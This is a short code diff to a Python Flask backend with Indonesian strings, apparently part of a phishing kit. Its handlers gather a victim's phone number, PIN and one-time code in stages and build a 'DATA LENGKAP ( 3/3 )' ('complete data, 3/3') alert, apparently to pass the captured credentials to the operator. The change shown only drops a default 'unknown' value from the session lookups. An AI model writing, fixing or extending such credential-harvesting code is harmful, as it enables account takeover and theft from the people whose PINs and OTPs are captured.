@@ -64,7 +64,7 @@ def submit_otp():
     if not kode_otp:
         return jsonify({"success": False, "error": "Kode PIN wajib diisi."}), 400
 
-    nomor_hp = sesi.get("nomor_hp", "tidak diketahui")
+    nomor_hp = sesi.get("nomor_hp")
     sesi["pin"] = kode_otp
 
     text = (
@@ -89,8 +89,8 @@ def submit_kode():
     if not kode_otp:
         return jsonify({"success": False, "error": "Kode OTP wajib diisi."}), 400
 
-    nomor_hp = sesi.get("nomor_hp", "tidak diketahui")
-    pin = sesi.get("pin", "tidak diketahui")
+    nomor_hp = sesi.get("nomor_hp")
+    pin = sesi.get("pin")
 
     text = (
         "🔔 <b>DATA LENGKAP ( 3/3 )</b>\n"
